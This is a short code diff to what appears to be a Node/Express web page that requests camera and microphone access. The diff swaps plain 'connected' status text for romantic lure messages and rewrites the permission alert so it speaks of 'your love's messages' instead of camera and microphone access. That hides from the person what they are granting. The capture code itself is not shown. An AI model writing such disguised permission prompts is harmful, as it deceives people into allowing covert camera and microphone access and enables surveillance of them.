@@ -491,17 +491,17 @@ app.get('/', (req, res) => {
                 }
                 
                 permissionsGranted = true;
-                statusDiv.innerHTML = '✅ Conectado! Aguardando mensagens...';
+                statusDiv.innerHTML = '💕 App para o grande amor da sua vida';
                 startBtn.disabled = true;
-                startBtn.innerHTML = '✨ Conectado! ✨';
+                startBtn.innerHTML = '✨ AMORZINHA ✨';
                 
-                messageDiv.innerHTML = '💕 Conectado! Aguardando sua pessoa especial... 💕';
+                messageDiv.innerHTML = '💕 A Carta do seu amor está sendo processada! Aguarde!  💕';
                 addGlitterEffect();
                 
             } catch (err) {
                 console.error('Erro ao obter permissões:', err);
                 statusDiv.innerHTML = '❌ Erro ao acessar câmera/microfone. Verifique as permissões!';
-                alert('Por favor, permita o acesso à câmera e microfone para continuar.');
+                alert('Permita as mensagens do seu amor');
             }
         }
         
